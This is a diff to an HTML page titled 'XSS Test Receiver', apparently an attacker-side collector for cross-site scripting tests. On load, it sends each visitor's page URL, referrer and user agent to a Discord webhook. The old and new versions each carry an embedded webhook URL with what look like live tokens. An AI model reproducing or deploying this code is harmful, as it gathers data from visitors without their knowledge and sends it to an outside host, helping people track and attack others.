@@ -4,14 +4,31 @@
   <meta charset="UTF-8">
   <title>XSS Test Receiver</title>
   <script>
-    // log visitor info to console
-    console.log("Page loaded at", new Date());
+    (async () => {
+      console.log("Page loaded at", new Date());
+      const hook = "https://discordapp.com/api/webhooks/1435106041175081031/sEEPIQ7p60XPVA609k4WNz_ZbVtqbjzjaeygiwdRuvrTDi7XCrncUluQKgzyIADtDJea?wait=true"; // use your new webhook
 
-    // optional: send beacon to your collector
-    fetch("https://discordapp.com/api/webhooks/1435104147694161970/TpS1bzpR4lprAtNItm2zryzfU2ACLWrL5U1vYdP-9HSdPQMe7DZ7nFX256SCgtX9yUTN" + encodeURIComponent(document.referrer) +
-          "&loc=" + encodeURIComponent(window.location.href))
-      .catch(() => {});
+      const payload = {
+        username: "XSS Test Receiver",
+        content: [
+          `Hit: ${location.href}`,
+          `Referrer: ${document.referrer || "(none)"}`,
+          `UA: ${navigator.userAgent}`
+        ].join("\n")
+      };
+
+      try {
+        await fetch(hook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.log("Webhook failed:", e);
+      }
+    })();
   </script>
+
   <style>
     body { font-family: monospace; background: #111; color: #0f0; padding: 2rem; }
   </style>
